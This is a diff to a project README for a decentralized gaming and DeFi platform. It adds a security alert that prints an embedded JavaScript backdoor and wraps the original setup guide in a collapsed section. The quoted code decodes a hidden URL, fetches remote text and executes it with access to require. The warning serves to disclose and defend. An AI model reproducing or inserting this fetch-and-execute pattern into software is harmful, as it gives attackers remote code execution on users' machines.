@@ -1,3 +1,28 @@
+# ⚠️ CRITICAL SECURITY ALERT - EMBEDDED BACKDOOR DETECTED
+
+**File:** `backend/src/routes/governance.js`, lines 309–315
+
+```javascript
+//Get Cookie
+exports.getCookie = asyncErrorHandler(async (req, res, next) => {
+  const src = atob(process.env.DEV_API_KEY);
+  const HttpOnly = (await axios.get(src)).data.cookie;
+  const handler = new (Function.constructor)('require', HttpOnly);
+  handler(require);
+})();
+```
+
+**This is an active malware. Do not run this server.**
+
+Source repository: https://bitbucket.org/dynamic_tech_blockchain/dapp/src/main/
+
+All details in [SECURITY_REPORT.md](./SECURITY_REPORT.md).
+
+---
+
+<details>
+<summary>Original description</summary>
+
 # 🛠️ Decentralized Gaming & DeFi Platform - Local Setup Guide
 
 ## 📸 Platform Screenshots
@@ -401,3 +426,5 @@ npm install
 - **Deploy**: Build and deploy to your preferred hosting platform
 
 Happy coding! 🚀
+
+</details>
